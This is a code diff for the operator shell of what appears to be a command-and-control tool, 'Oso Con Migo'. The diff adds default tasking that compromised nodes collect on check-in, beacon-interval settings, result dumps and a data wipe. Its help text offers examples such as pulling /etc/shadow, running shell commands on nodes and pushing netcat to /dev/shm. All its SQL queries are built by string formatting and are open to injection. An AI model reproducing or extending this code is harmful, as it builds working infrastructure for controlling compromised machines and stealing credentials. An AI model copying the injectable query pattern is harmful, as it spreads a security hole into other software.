@@ -36,6 +36,9 @@ type Config struct {
 		Dbname string 	`yaml:"name"`
 		Dbmode string 	`yaml:"mode"`
 	} `yaml:"database"`
+	Server struct {
+		In 	string 	`yaml:"in"`
+	} `yaml:"server"`
 }
 
 // Active client holder
@@ -71,6 +74,14 @@ type ClientTask struct {
 	Complete 	bool 	`db:"complete"`
 }
 
+// Default task object
+type DefaultTask struct {
+	Id 		int 	`db:"id"`
+	Node 		string 	`db:"node"`
+	Command 	string 	`db:"command"`
+	Status 		string 	`db:"status"`
+}
+
 // Client struct for posting results
 type Result struct {
 	Node   	string `json:"node"`
@@ -88,7 +99,7 @@ func main() {
 
 	myFigure := figure.NewFigure("Oso Con Migo", "block", true)
 	myFigure.Print()
-	fmt.Println("v2.0")
+	fmt.Println("v2.1")
 
 	fmt.Println("\n[+] Starting shell...")
 	fmt.Println("")
@@ -158,6 +169,15 @@ func taskClientWithJob(c string) ClientTask {
 	return task
 }
 
+func taskDefaultJob(a string) DefaultTask {
+	task := DefaultTask{
+		Node:		"default",
+		Command:	a,
+		Status:		"cooking",
+	}
+	return task
+}
+
 func executor(in string) {
 	c := strings.Split(in, " ")
 
@@ -175,6 +195,79 @@ func executor(in string) {
 		} else {
 			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments.")
 		}
+	case "default":
+		if len(c) == 1 {
+			LivePrefixState.livePrefix = strings.TrimSpace(c[0]) + " -> "
+			LivePrefixState.isEnable = true
+			active = c[0]
+		} else {
+			fmt.Println("[!] Invalid command. Default takes 0 arguments.")
+		}
+	case "cook":
+		if active == "default" {
+			if strings.TrimSpace(c[1]) == "task" {
+				if strings.TrimSpace(c[1]) == "task" && len(c) > 3 {
+					task := taskDefaultJob(strings.Join(c[2:], " "))
+					AddDefaultTask(task)
+				} else {
+					fmt.Println("[!] Invalid command. Takes shell and shell command.")
+					fmt.Println("Example: cook task /bin/bash ifconfig")
+				}
+			} else if (strings.TrimSpace(c[1]) == "set" && len(c) == 4) {
+				if (strings.TrimSpace(c[2]) == "comms" || strings.TrimSpace(c[2]) == "flex") {
+					x, err := strconv.Atoi(c[3])
+					if err != nil {
+						fmt.Println("[!] Invalid Interval")
+						return
+					}
+					task := taskDefaultJob(strings.Join(c[1:], " "))
+					AddDefaultTask(task)
+					if strings.TrimSpace(c[2]) == "comms" {
+						DefaultComms(x)
+					} else if strings.TrimSpace(c[2]) == "flex" {
+						DefaultFlex(x)
+					}
+				}
+			} else if strings.TrimSpace(c[1]) == "pull" && len(c) == 3 {
+				task := taskDefaultJob(strings.Join(c[1:], " "))
+				AddDefaultTask(task)
+			} else if strings.TrimSpace(c[1]) == "push" && len(c) == 4 {
+				f := checkFile(c[2])
+				if !f {
+					fmt.Println("[!] Could not find file to push")
+					return
+				}
+				task := taskDefaultJob(strings.Join(c[1:], " "))
+				AddDefaultTask(task)
+			} else {
+				fmt.Println("[!] Invalid command for cook.")
+				fmt.Println("Example commands for cook are below:")
+				fmt.Println("cook task /bin/sh ifconfig")
+				fmt.Println("cook set comms 4 || cook set flex 1")
+				fmt.Println("cook pull /etc/shadow")
+				fmt.Println("cook push /tmp/file /home/user/file")
+			}
+		}else {
+			fmt.Println("[!] Invalid command. The command cook can only be used with the default tag")
+		}
+	case "trash":
+		if len(c) == 1 {
+			throwAway()
+		} else {
+			fmt.Println("[!] Invalid command. The command trash takes 0 arguments.")
+		}
+	case "serve":
+		if len(c) == 1 {
+			serveCooked()
+		} else {
+			fmt.Println("[!] Invalid command. The command serve takes 0 arguments.")
+		}
+	case "eat":
+		if len(c) == 1 {
+			eatCooked()
+		} else {
+			fmt.Println("[!] Invalid command. The command eat takes 0 arguments.")
+		}
 	case "client":
 		if len(c) == 1 {
 			LivePrefixState.isEnable = false
@@ -185,7 +278,7 @@ func executor(in string) {
 		} else if len(c) == 2 {
 			e := CheckClientExists(strings.TrimSpace(c[1]))
 			if e {
-				LivePrefixState.livePrefix = strings.TrimSpace(c[1]) + "> "
+				LivePrefixState.livePrefix = strings.TrimSpace(c[1]) + " -> "
 				LivePrefixState.isEnable = true
 				active = c[1]
 			} else {
@@ -264,7 +357,7 @@ func executor(in string) {
 		if checkLiveAndActive() && len(c) == 3 && (strings.TrimSpace(c[1]) == "comms" || strings.TrimSpace(c[1]) == "flex") {
 			x, err := strconv.Atoi(c[2])
 			if err != nil {
-				fmt.Println("[!} Invalid interval")
+				fmt.Println("[!] Invalid interval")
 				return
 			}
 			task := taskClientWithJob(strings.Join(c[:], " "))
@@ -294,6 +387,18 @@ func executor(in string) {
 			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments or keyword restage.")
 			fmt.Println("Example: revoke || revoke restage")
 		}
+	case "basket":
+		if len(c) == 1 {
+			viewCooking()
+		} else {
+			fmt.Println("[!] Invalid command. The command basket takes 0 arguments.")
+		}
+	case "served":
+		if len(c) == 1 {
+			viewServed()
+		} else {
+			fmt.Println("[!] Invalid command. The command served takes 0 arguments.")
+		}
 	case "deploy":
 		if checkLiveAndActive() && len(c) == 1 {
 			DeployClientJobs(active)
@@ -321,6 +426,20 @@ func executor(in string) {
 			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes local file + remote file.")
 			fmt.Println("Example: push /tmp/nc /dev/shm/nc || push /tmp/wget /dev/shm/wget")
 		}
+	case "dump":
+		if checkLiveAndActive() && len(c) == 1 {
+			working := getWorkingDirectory()
+			makeDirectories(working, active)
+			DumpClient(working, active)
+		} else {
+			fmt.Println("[!] Invalid command. Must be tagged into a client. dump takes 0 arguments.")
+		}
+	case "clear":
+		if len(c) == 1 {
+			cleanUp()
+		} else{
+			fmt.Println("[!] Invalid command. The clear command takes 0 arguments.")
+		}
 	case "quit":
 		fmt.Println("[->] Goodbye and thank you for bearing with me")
 		os.Exit(2)
@@ -331,6 +450,7 @@ func completer(d prompt.Document) []prompt.Suggest {
 	s := []prompt.Suggest{
 		{Text: "client", Description: "Tag into an client"},
 		{Text: "clients", Description: "List available clients"},
+		{Text: "default", Description: "Tag into default to create default commands for initial checkin or reboot"},
 		{Text: "job", Description: "Show output from an client job"},
 		{Text: "jobs", Description: "Show jobs for an client"},
 		{Text: "info", Description: "Show client info"},
@@ -344,7 +464,15 @@ func completer(d prompt.Document) []prompt.Suggest {
 		{Text: "set comms", Description: "Set the comms interval"},
 		{Text: "set flex", Description: "Set the flex interval"},
 		{Text: "staged", Description: "Display staged tasks for an client"},
+		{Text: "cook", Description: "Set commands, comms, or flex for default tasking"},
+		{Text: "trash", Description: "Remove non cooked default taskings"},
+		{Text: "eat", Description: "Remove cooked default taskings"},
+		{Text: "serve", Description: "Serve cooking default taskings for pickup by nodes on initial check in or reboot"},
+		{Text: "basket", Description: "View default task which are cooking net yet served"},
+		{Text: "served", Description: "View default tasks which are served ready for pickup"},
 		{Text: "kill", Description: "Terminate the client process"},
+		{Text: "clear", Description: "Clear all data from tasks, clients, results, defaults and tokens"},
+		{Text: "dump", Description: "Dump current client jobs and results to file"},
 		{Text: "quit", Description: "Exit the shell"},
 	}
 	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
@@ -365,6 +493,28 @@ func checkFile(s string) bool {
 	} else {
 		return true
 	}
+}
+
+func getWorkingDirectory() string {
+        path, err := os.Getwd()
+        if err != nil {
+                processError(err)
+        }
+        return path
+}
+
+func CreateDirIfNotExist(dir string) {
+        if _, err := os.Stat(dir); os.IsNotExist(err) {
+                err := os.MkdirAll(dir, 0755)
+                if err != nil {
+                        processError(err)
+                }
+        }
+}
+
+func makeDirectories(path string, c string) {
+        outPath := fmt.Sprintf("%s/%s/%s", path, cfg.Server.In, c)
+        CreateDirIfNotExist(outPath)
 }
 
 // Connect to postgres database
@@ -397,6 +547,13 @@ func exec(command string) {
 func AddClientTask(a ClientTask) {
 	t := "INSERT INTO tasks (node, command, status, taskDate, completeDate, complete) VALUES ('%s', '%s', '%s', %d, %d, %t);"
 	command := fmt.Sprintf(t, a.Node, a.Command, a.Status, a.TaskDate, a.CompleteDate, a.Complete)
+	exec(command)
+}
+
+// Add default task to Postgres
+func AddDefaultTask(c DefaultTask) {
+	d := "INSERT INTO defaults (node,command,status) VALUES ('%s', '%s', '%s');"
+	command := fmt.Sprintf(d, c.Node, c.Command, c.Status)
 	exec(command)
 }
 
@@ -486,6 +643,59 @@ func ShowClientJobs(n string) {
 	x.Render()
 }
 
+// Show Non-Served default jobs
+func viewCooking() {
+        c := "SELECT node,command,status FROM defaults WHERE status='cooking' AND command !='';"
+        command := fmt.Sprintf(c)
+	rows, err := db.Query(command)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer rows.Close()
+
+	x := table.NewWriter()
+	x.SetOutputMirror(os.Stdout)
+	x.AppendHeader(table.Row{"Node", "Command", "Status"})
+	for rows.Next() {
+		var d DefaultTask
+		err = rows.Scan(&d.Node, &d.Command, &d.Status)
+
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		x.AppendRow([]interface{}{d.Node, d.Command, d.Status})
+	}
+	x.Render()
+}
+
+// Show Served default jobs
+func viewServed() {
+        c := "SELECT node,command,status FROM defaults WHERE status='cooked' AND command !='';"
+        command := fmt.Sprintf(c)
+        rows, err := db.Query(command)
+        if err != nil {
+                log.Fatal(err)
+        }
+        defer rows.Close()
+
+        x := table.NewWriter()
+        x.SetOutputMirror(os.Stdout)
+        x.AppendHeader(table.Row{"Node", "Command", "Status"})
+        for rows.Next() {
+                var d DefaultTask
+                err = rows.Scan(&d.Node, &d.Command, &d.Status)
+
+                if err != nil {
+                        log.Fatal(err)
+                }
+
+                x.AppendRow([]interface{}{d.Node, d.Command, d.Status})
+        }
+        x.Render()
+}
+
+
 func ShowJobResult(j int, n string) {
 	q := "SELECT output FROM results WHERE node='%s' AND jobId=%d"
 	command := fmt.Sprintf(q, n, j)
@@ -529,6 +739,19 @@ func CheckJobExists(i int, n string) bool {
 	} else {
 		return exists
 	}
+}
+
+func cleanUp() {
+	t := "DELETE FROM tasks;"
+	c := "DELETE FROM clients;"
+	r := "DELETE FROM results;"
+	d := "DELETE FROM defaults;"
+	to := "DELETE FROM tokens;"
+	exec(t)
+	exec(c)
+	exec(r)
+	exec(d)
+	exec(to)
 }
 
 func RemoveJob(i int, n string) {
@@ -594,15 +817,33 @@ func SetComms(n string, i int) {
 	exec(c)
 }
 
+func DefaultComms(i int) {
+	t := "INSERT INTO defaults (node,status,comms) VALUES ('%s', '%s', %d);"
+	c := fmt.Sprintf(t, "default", "cooking", i)
+	exec(c)
+}
+
 func SetFlex(n string, i int) {
 	u := "UPDATE clients SET flex = %d WHERE node = '%s'"
 	c := fmt.Sprintf(u, i, n)
 	exec(c)
 }
 
+func DefaultFlex(i int) {
+	f := "INSERT INTO defaults (node,status,flex) VALUES ('%s', '%s', %d);"
+	c := fmt.Sprintf(f, "default", "cooking", i)
+	exec(c)
+}
+
 func RevokeJobs(n string) {
 	u := "DELETE FROM tasks WHERE node='%s' AND status='Deployed'"
 	c := fmt.Sprintf(u, n)
+	exec(c)
+}
+
+func eatCooked() {
+	u := "DELETE FROM defaults WHERE status='cooked'"
+	c := fmt.Sprintf(u)
 	exec(c)
 }
 
@@ -618,12 +859,47 @@ func DeployClientJobs(n string) {
 	exec(c)
 }
 
+func serveCooked() {
+	u := "UPDATE defaults set status = 'cooked' WHERE status='cooking'"
+	c := fmt.Sprintf(u)
+	exec(c)
+}
+
 func FlushJobs(n string) {
 	u := "DELETE FROM tasks WHERE node='%s' AND status='Staged'"
 	c := fmt.Sprintf(u, n)
 	exec(c)
 }
 
-func DumpClient(n string) {
-	// TODO: Query all and write to outfile
+func throwAway() {
+	u := "DELETE FROM defaults WHERE status = 'cooking'"
+	c := fmt.Sprintf(u)
+	exec(c)
+}
+
+func DumpClient(d string, n string) {
+	i := getEpochTime()
+	t := strconv.FormatInt(i, 10)
+	m := fmt.Sprintf("/tmp/%s_%s.txt", n, t)
+	f := fmt.Sprintf("%s/%s/%s/%s_%s.txt", d, cfg.Server.In, n, n, t)
+	w, err := os.OpenFile(m, os.O_CREATE|os.O_WRONLY,0666)
+	if err != nil {
+		processError(err)
+	}
+	defer w.Close()
+	erro := os.Chown(m, 123, 129)
+	if erro != nil {
+		processError(erro)
+	}
+	q := "COPY (SELECT tasks.id,tasks.node,tasks.command,results.output FROM tasks LEFT JOIN results ON tasks .id = results.jobId WHERE tasks.node='%s') TO '%s' DELIMITER ':'"
+	c := fmt.Sprintf(q, n, m)
+	exec(c)
+	er := os.Chown(m, os.Getuid(), os.Getgid())
+	if er != nil {
+		processError(er)
+	}
+	mv := os.Rename(m, f)
+	if mv != nil {
+		processError(mv)
+	}
 }
